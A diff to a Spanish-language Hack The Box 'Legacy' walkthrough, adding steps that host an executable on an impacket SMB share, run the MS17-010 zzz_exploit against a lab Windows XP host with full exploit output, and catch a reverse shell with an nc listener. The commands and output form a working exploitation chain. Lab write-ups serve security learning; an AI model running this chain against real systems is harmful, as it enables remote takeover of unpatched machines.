@@ -1499,6 +1499,21 @@ drwxr-xr-x 4 fz3r0 fz3r0 4.0K Dec 28 23:23 MS17-010
 
 ```
 
+- Creando el smbshare usando el `impacket-smbserver`
+
+```sh
+┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Legacy/01_-_Exploits]
+└─$ impacket-smbserver smbfolder $(pwd)
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
 - Forjando el comando remoto para alcanzar el .exe de la carpeta en mi máquina:
 
 ```py
@@ -1527,11 +1542,55 @@ rlwrap nc -nlvp 666
 - lanzando el `zzz`
 
 ```sh
+┌──(fz3r0㉿Fz3r0)-[~/…/01_-_Fz3r0_HTB/Legacy/01_-_Exploits/MS17-010]
+└─$ python2 zzz_exploit.py $ip_target spoolss
+Target OS: Windows 5.1
+Groom packets
+attempt controlling next transaction on x86
+success controlling one transaction
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x864657f8
+SESSION: 0xe1009010
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+TRANS2: 0x7ac90
+modify transaction struct for arbitrary read/write
+make this SMB session to be SYSTEM
+current TOKEN addr: 0xe23c7ac8
+userAndGroupCount: 0x3
+userAndGroupsAddr: 0xe23c7b68
+overwriting token UserAndGroups
+Opening SVCManager on 10.10.10.4.....
+Creating service dUgO.....
+Starting service dUgO.....
+The NETBIOS connection with the remote host timed out.
+Removing service dUgO.....
+ServiceExec Error on: 10.10.10.4
+nca_s_proto_error
+Done
 
 ```
 
 - zapato y bombín, reverse shell:
 
 ```sh
+┌──(fz3r0㉿Fz3r0)-[~/…/01_-_Fz3r0_HTB/Legacy/01_-_Exploits/MS17-010]
+└─$ rlwrap nc -nlvp 666
+listening on [any] 666 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.4] 1046
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
 
 ```
+- PoC:
+
+![image](https://user-images.githubusercontent.com/94720207/209905711-c49ad712-1e01-4643-9ea4-0dcee5fdfd61.png)
+
+- En este caso ya soy root como se vió en la opción 1 del exploit con Metasploit. 
+
+
